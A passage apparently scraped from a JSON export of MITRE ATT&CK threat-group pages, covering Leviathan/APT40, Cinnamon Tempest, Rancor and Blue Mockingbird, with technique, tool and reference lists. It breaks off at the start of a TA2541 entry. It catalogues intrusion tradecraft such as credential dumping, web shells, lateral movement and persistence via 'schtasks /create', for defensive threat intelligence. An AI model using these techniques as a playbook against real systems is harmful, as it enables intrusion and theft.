Proxy Leviathan has used multi-hop proxies to disguise the source of their malicious traffic.[1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Leviathan has targeted RDP credentials and used it to move through the victim environment.[9] .002 Remote Services: SMB/Windows Admin Shares Leviathan used remote shares to move laterally through victim networks during Leviathan Australian Intrusions.[4] .004 Remote Services: SSH Leviathan used ssh for internal reconnaissance.[9] Leviathan used SSH brute force techniques to move laterally within victim environments during Leviathan Australian Intrusions.[4] Enterprise T1018 Remote System Discovery Leviathan performed extensive remote host enumeration to build their own map of victim networks during Leviathan Australian Intrusions.[4] Enterprise T1594 Search Victim-Owned Websites Leviathan enumerated compromised web application resources to identify additional endpoints and resources linkd to the website for follow-on access during Leviathan Australian Intrusions.[4] Enterprise T1505 .003 Server Software Component: Web Shell Leviathan relies on web shells for an initial foothold as well as persistence into the victim's systems.[9][1][4] Leviathan relied extensively on web shell use following initial access for persistence and command execution purposes in victim environments during Leviathan Australian Intrusions.[4] Enterprise T1528 Steal Application Access Token Leviathan abused access to compromised appliances to collect JSON Web Tokens (JWTs), used for creating virtual desktop sessions, during Leviathan Australian Intrusions.[4] Enterprise T1558 .003 Steal or Forge Kerberos Tickets: Kerberoasting Leviathan used Kerberoasting techniques during Leviathan Australian Intrusions.[4] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Leviathan has used stolen code signing certificates to sign malware.[3][9] Enterprise T1218 .010 System Binary Proxy Execution: Regsvr32 Leviathan has used regsvr32 for execution.[2] Enterprise T1082 System Information Discovery Leviathan performed host enumeration and data gathering operations on victim machines during Leviathan Australian Intrusions.[4] Enterprise T1552 Unsecured Credentials Leviathan gathered credentials hardcoded in binaries located on victim devices during Leviathan Australian Intrusions.[4] .001 Credentials In Files Leviathan gathered credentials stored in files related to Building Management System (BMS) operations during Leviathan Australian Intrusions.[4] Enterprise T1204 .001 User Execution: Malicious Link Leviathan has sent spearphishing email links attempting to get a user to click.[2][1] .002 User Execution: Malicious File Leviathan has sent spearphishing attachments attempting to get a user to click.[2][1] Enterprise T1078 Valid Accounts Leviathan has obtained valid accounts to gain initial access.[1][5][4] Leviathan used captured, valid account information to log into victim web applications and appliances during Leviathan Australian Intrusions.[4] .002 Domain Accounts Leviathan compromised domain credentials during Leviathan Australian Intrusions.[4] .003 Local Accounts Leviathan used captured local account information, such as service accounts, for actions during Leviathan Australian Intrusions.[4] Enterprise T1102 .003 Web Service: One-Way Communication Leviathan has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.[3] Enterprise T1047 Windows Management Instrumentation Leviathan has used WMI for execution.[2] Software ID Name References Techniques S0110 at [9] Scheduled Task/Job: At S0642 BADFLICK [3][5] Archive Collected Data: Archive via Library, Data from Local System, Deobfuscate/Decode Files or Information, File and Directory Discovery, Ingress Tool Transfer, Phishing: Spearphishing Attachment, System Information Discovery, System Network Configuration Discovery, User Execution: Malicious File, Virtualization/Sandbox Evasion: Time Based Evasion S0190 BITSAdmin [3] BITS Jobs, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S0069 BLACKCOFFEE [3] Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Indicator Removal: File Deletion, Multi-Stage Channels, Process Discovery, Web Service: Dead Drop Resolver, Web Service: Bidirectional Communication S0020 China Chopper [3][1][5] Application Layer Protocol: Web Protocols, Brute Force: Password Guessing, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, File and Directory Discovery, Indicator Removal: Timestomp, Ingress Tool Transfer, Network Service Discovery, Obfuscated Files or Information: Software Packing, Server Software Component: Web Shell S0154 Cobalt Strike [2][3][1] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0021 Derusbi [3][1] Audio Capture, Command and Scripting Interpreter: Unix Shell, Encrypted Channel: Symmetric Cryptography, Fallback Channels, File and Directory Discovery, Indicator Removal: Timestomp, Indicator Removal: File Deletion, Input Capture: Keylogging, Non-Application Layer Protocol, Non-Standard Port, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Screen Capture, System Binary Proxy Execution: Regsvr32, System Information Discovery, System Owner/User Discovery, Video Capture S0363 Empire [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0032 gh0st RAT [1] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Process Discovery, Process Injection, Query Registry, Screen Capture, Shared Modules, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution S0232 HOMEFRY [3] Command and Scripting Interpreter: Windows Command Shell, Obfuscated Files or Information: Encrypted/Encoded File, OS Credential Dumping S0233 MURKYTOP [3][1] Account Discovery: Local Account, Command and Scripting Interpreter: Windows Command Shell, Indicator Removal: File Deletion, Network Service Discovery, Network Share Discovery, Permission Groups Discovery, Remote System Discovery, Scheduled Task/Job: At, System Information Discovery S0228 NanHaiShu [2][1] Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, System Binary Proxy Execution: Mshta, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery S0039 Net [9] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0229 Orz [2][1][5] Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Indicator Removal, Ingress Tool Transfer, Modify Registry, Obfuscated Files or Information, Process Discovery, Process Injection: Process Hollowing, Software Discovery, System Binary Proxy Execution: Regsvr32, System Information Discovery, System Network Configuration Discovery, Web Service: Bidirectional Communication S0194 PowerSploit [1] Access Token Manipulation, Account Discovery: Local Account, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Security Support Provider, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Windows Credential Manager, Data from Local System, Domain Trust Discovery, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: DLL, Hijack Execution Flow: Path Interception by Search Order Hijacking, Input Capture: Keylogging, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Reflective Code Loading, Scheduled Task/Job: Scheduled Task, Screen Capture, Steal or Forge Kerberos Tickets: Kerberoasting, Unsecured Credentials: Credentials in Registry, Unsecured Credentials: Group Policy Preferences, Windows Management Instrumentation S0183 Tor [1] Encrypted Channel: Asymmetric Cryptography, Proxy: Multi-hop Proxy S0005 Windows Credential Editor [9] OS Credential Dumping: LSASS Memory References CISA. (2021, July 19). (AA21-200A) Joint Cybersecurity Advisory \u2013 Tactics, Techniques, and Procedures of Indicted APT40 Actors Associated with China\u2019s MSS Hainan State Security Department. Retrieved August 12, 2021. Axel F, Pierre T. (2017, October 16). Leviathan: Espionage actor spearphishes maritime and defense targets. Retrieved February 15, 2018. FireEye. (2018, March 16). Suspected Chinese Cyber Espionage Group (TEMP.Periscope) Targeting U.S. Engineering and Maritime Industries. Retrieved April 11, 2018. CISA et al. (2024, July 8). People\u2019s Republic of China (PRC) Ministry of State Security APT40 Tradecraft in Action. Retrieved February 3, 2025. Accenture iDefense Unit. (2019, March 5). Mudcarp's Focus on Submarine Technologies. Retrieved August 24, 2021. Adam Kozy. (2018, August 30). Two Birds, One Stone Panda. Retrieved August 24, 2021. Ben Koehl, Joe Hannon. (2020, September 24). Microsoft Security - Detecting Empires in the Cloud. Retrieved August 24, 2021. SecureWorks. (n.d.). Threat Profile - BRONZE MOHAWK. Retrieved August 24, 2021. Plan, F., et al. (2019, March 4). APT40: Examining a China-Nexus Espionage Actor. Retrieved March 18, 2019. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. "
},
{
"id": 96,
"title": "Cinnamon Tempest, DEV-0401, Emperor Dragonfly, BRONZE STARLIGHT, Group G1021",
"path": "/groups/G1021/index.html",
"content": " Cinnamon Tempest Cinnamon Tempest is a China-based threat group that has been active since at least 2021 deploying multiple strains of ransomware based on the leaked Babuk source code. Cinnamon Tempest does not operate their ransomware on an affiliate model or purchase access but appears to act independently in all stages of the attack lifecycle. Based on victimology, the short lifespan of each ransomware variant, and use of malware attributed to government-sponsored threat groups, Cinnamon Tempest may be motivated by intellectual property theft or cyberespionage rather than financial gain.[1][2][3][4] ID: G1021 \u24d8 Associated Groups: DEV-0401, Emperor Dragonfly, BRONZE STARLIGHT Version: 1.0 Created: 06 December 2023 Last Modified: 04 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description DEV-0401 [2] Emperor Dragonfly [5] BRONZE STARLIGHT [6] Techniques Used Domain ID Name Use Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Cinnamon Tempest has used PowerShell to communicate with C2, download files, and execute reconnaissance commands.[5] .003 Command and Scripting Interpreter: Windows Command Shell Cinnamon Tempest has executed ransomware using batch scripts deployed via GPO.[1] .006 Command and Scripting Interpreter: Python Cinnamon Tempest has used a customized version of the Impacket wmiexec.py module to create renamed output files.[1] Enterprise T1543 .003 Create or Modify System Process: Windows Service Cinnamon Tempest has created system services to establish persistence for deployed tooling.[5] Enterprise T1140 Deobfuscate/Decode Files or Information Cinnamon Tempest has used weaponized DLLs to load and decrypt payloads.[5] Enterprise T1484 .001 Domain or Tenant Policy Modification: Group Policy Modification Cinnamon Tempest has used Group Policy to deploy batch scripts for ransomware deployment.[1] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Cinnamon Tempest has uploaded captured keystroke logs to the Alibaba Cloud Object Storage Service, Aliyun OSS.[5] Enterprise T1190 Exploit Public-Facing Application Cinnamon Tempest has exploited multiple unpatched vulnerabilities for initial access including vulnerabilities in Microsoft Exchange, Manage Engine AdSelfService Plus, Confluence, and Log4j.[1][7][5][4] Enterprise T1657 Financial Theft Cinnamon Tempest has maintained leak sites for exfiltrated data in attempt to extort victims into paying a ransom.[1] Enterprise T1574 .001 Hijack Execution Flow: DLL Cinnamon Tempest has used search order hijacking to launch Cobalt Strike Beacons.[1][4] Cinnamon Tempest has also abused legitimate executables to side-load weaponized DLLs.[5] Enterprise T1105 Ingress Tool Transfer Cinnamon Tempest has downloaded files, including Cobalt Strike, to compromised hosts.[5] Enterprise T1588 .002 Obtain Capabilities: Tool Cinnamon Tempest has used open-source tools including customized versions of the Iox proxy tool, NPS tunneling tool, Meterpreter, and a keylogger that uploads data to Alibaba cloud storage.[5][4] Enterprise T1572 Protocol Tunneling Cinnamon Tempest has used the Iox and NPS proxy and tunneling tools in combination create multiple connections through a single tunnel.[5] Enterprise T1090 Proxy Cinnamon Tempest has used a customized version of the Iox port-forwarding and proxy tool.[5] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares Cinnamon Tempest has used SMBexec for lateral movement.[5] Enterprise T1080 Taint Shared Content Cinnamon Tempest has deployed ransomware from a batch file in a network share.[1] Enterprise T1078 Valid Accounts Cinnamon Tempest has used compromised user accounts to deploy payloads and create system services.[5] .002 Domain Accounts Cinnamon Tempest has obtained highly privileged credentials such as domain administrator in order to deploy malware.[1] Enterprise T1047 Windows Management Instrumentation Cinnamon Tempest has used Impacket for lateral movement via WMI.[1][5] Software ID Name References Techniques S1096 Cheerscrypt [5][3] Command and Scripting Interpreter: Hypervisor CLI, Data Encrypted for Impact, File and Directory Discovery, Service Stop, Virtual Machine Discovery S0154 Cobalt Strike [1][6] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S1097 HUI Loader [4][6] Deobfuscate/Decode Files or Information, Hijack Execution Flow: DLL, Impair Defenses: Indicator Blocking S0357 Impacket [1][5] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0664 Pandora [1][4][5][6] Application Layer Protocol: Web Protocols, Create or Modify System Process: Windows Service, Encrypted Channel: Symmetric Cryptography, Exploitation for Privilege Escalation, Hijack Execution Flow: DLL, Ingress Tool Transfer, Modify Registry, Obfuscated Files or Information: Compression, Process Discovery, Process Injection, Subvert Trust Controls: Code Signing Policy Modification, System Services: Service Execution, Traffic Signaling S0013 PlugX [6] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver S1040 Rclone [5] Archive Collected Data: Archive via Utility, Data Transfer Size Limits, Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery S0633 Sliver [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Data Obfuscation: Steganography, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Ingress Tool Transfer, Obfuscated Files or Information, Obfuscated Files or Information: Compile After Delivery, Obfuscated Files or Information: Encrypted/Encoded File, OS Credential Dumping: LSASS Memory, Process Injection, Proxy: Internal Proxy, Screen Capture, Steal or Forge Kerberos Tickets: Golden Ticket, System Network Configuration Discovery, System Network Connections Discovery References Microsoft. (2022, May 9). Ransomware as a service: Understanding the cybercrime gig economy and how to protect yourself. Retrieved March 10, 2023. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Dela Cruz, A. et al. (2022, May 25). New Linux-Based Ransomware Cheerscrypt Targeting ESXi Devices Linked to Leaked Babuk Source Code. Retrieved December 19, 2023. Counter Threat Unit Research Team . (2022, June 23). BRONZE STARLIGHT RANSOMWARE OPERATIONS USE HUI LOADER. Retrieved December 7, 2023. Biderman, O. et al. (2022, October 3). REVEALING EMPEROR DRAGONFLY: NIGHT SKY AND CHEERSCRYPT - A SINGLE RANSOMWARE GROUP. Retrieved December 6, 2023. SecureWorks. (n.d.). BRONZE STARLIGHT. Retrieved December 6, 2023. Microsoft Threat Intelligence. (2021, December 11). Guidance for preventing, detecting, and hunting for exploitation of the Log4j 2 vulnerability. Retrieved December 7, 2023. "
},
{
"id": 97,
"title": "Rancor, Group G0075",
"path": "/groups/G0075/index.html",
"content": " Rancor Rancor is a threat group that has led targeted campaigns against the South East Asia region. Rancor uses politically-motivated lures to entice victims to open malicious documents. [1] ID: G0075 Version: 1.3 Created: 17 October 2018 Last Modified: 09 February 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols Rancor has used HTTP for C2.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Rancor has used cmd.exe to execute commmands.[1] .005 Command and Scripting Interpreter: Visual Basic Rancor has used VBS scripts as well as embedded macros for execution.[1] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription Rancor has complied VBScript-generated MOF files into WMI event subscriptions for persistence.[2] Enterprise T1105 Ingress Tool Transfer Rancor has downloaded additional malware, including by using certutil.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment Rancor has attached a malicious document to an email to gain initial access.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Rancor launched a scheduled task to gain persistence using the schtasks /create /sc command.[1] Enterprise T1218 .007 System Binary Proxy Execution: Msiexec Rancor has used msiexec to download and execute malicious installer files over HTTP.[1] Enterprise T1204 .002 User Execution: Malicious File Rancor attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.[1] Software ID Name References Techniques S0160 certutil [1] Archive Collected Data: Archive via Utility, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Subvert Trust Controls: Install Root Certificate S0255 DDKONG [1] Deobfuscate/Decode Files or Information, File and Directory Discovery, Ingress Tool Transfer, System Binary Proxy Execution: Rundll32 S0254 PLAINTEE [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Modify Registry, Process Discovery, System Information Discovery, System Network Configuration Discovery S0075 Reg [1] Modify Registry, Query Registry, Unsecured Credentials: Credentials in Registry References Ash, B., et al. (2018, June 26). RANCOR: Targeted Attacks in South East Asia Using PLAINTEE and DDKONG Malware Families. Retrieved July 2, 2018. Jen Miller-Osborn and Mike Harbison. (2019, December 17). Rancor: Cyber Espionage Group Uses New Custom Malware to Attack Southeast Asia. Retrieved February 9, 2024. "
},
{
"id": 98,
"title": "Blue Mockingbird, Group G0108",
"path": "/groups/G0108/index.html",
"content": " Blue Mockingbird Blue Mockingbird is a cluster of observed activity involving Monero cryptocurrency-mining payloads in dynamic-link library (DLL) form on Windows systems. The earliest observed Blue Mockingbird tools were created in December 2019.[1] ID: G0108 Contributors: Tony Lambert, Red Canary Version: 1.3 Created: 26 May 2020 Last Modified: 10 July 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1134 Access Token Manipulation Blue Mockingbird has used JuicyPotato to abuse the SeImpersonate token privilege to escalate from web application pool accounts to NT Authority\\SYSTEM.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Blue Mockingbird has used PowerShell reverse TCP shells to issue interactive commands over a network connection.[1] .003 Command and Scripting Interpreter: Windows Command Shell Blue Mockingbird has used batch script files to automate execution and deployment of payloads.[1] Enterprise T1543 .003 Create or Modify System Process: Windows Service Blue Mockingbird has made their XMRIG payloads persistent as a Windows Service.[1] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription Blue Mockingbird has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file.[1] Enterprise T1190 Exploit Public-Facing Application Blue Mockingbird has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.[1] Enterprise T1574 .012 Hijack Execution Flow: COR_PROFILER Blue Mockingbird has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Blue Mockingbird has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.[1] Enterprise T1112 Modify Registry Blue Mockingbird has used Windows Registry modifications to specify a DLL payload.[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Blue Mockingbird has obfuscated the wallet address in the payload binary.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Blue Mockingbird has obtained and used tools such as Mimikatz.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Blue Mockingbird has used Mimikatz to retrieve credentials from LSASS memory.[1] Enterprise T1090 Proxy Blue Mockingbird has used FRP, ssf, and Venom to establish SOCKS proxy connections.[1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Blue Mockingbird has used Remote Desktop to log on to servers interactively and manually copy files to remote hosts.[1] .002 Remote Services: SMB/Windows Admin Shares Blue Mockingbird has used Windows Explorer to manually copy malicious files to remote hosts over SMB.[1] Enterprise T1496 .001 Resource Hijacking: Compute Hijacking Blue Mockingbird has used XMRIG to mine cryptocurrency on victim systems.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Blue Mockingbird has used Windows Scheduled Tasks to establish persistence on local and remote hosts.[1] Enterprise T1218 .010 System Binary Proxy Execution: Regsvr32 Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.[1] .011 System Binary Proxy Execution: Rundll32 Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using rundll32.exe.[1] Enterprise T1082 System Information Discovery Blue Mockingbird has collected hardware details for the victim's system, including CPU and memory information.[1] Enterprise T1569 .002 System Services: Service Execution Blue Mockingbird has executed custom-compiled XMRIG miner DLLs by configuring them to execute via the \"wercplsupport\" service.[1] Enterprise T1047 Windows Management Instrumentation Blue Mockingbird has used wmic.exe to set environment variables.[1] Software ID Name References Techniques S1144 FRP [1] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: JavaScript, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Network Service Discovery, Non-Application Layer Protocol, Protocol Tunneling, Proxy, Proxy: Multi-hop Proxy, System Network Connections Discovery S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket References Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020. "
},
{
"id": 99,
"title": "TA2541, Group G1018",
"path": "/groups/G1018/index.html",
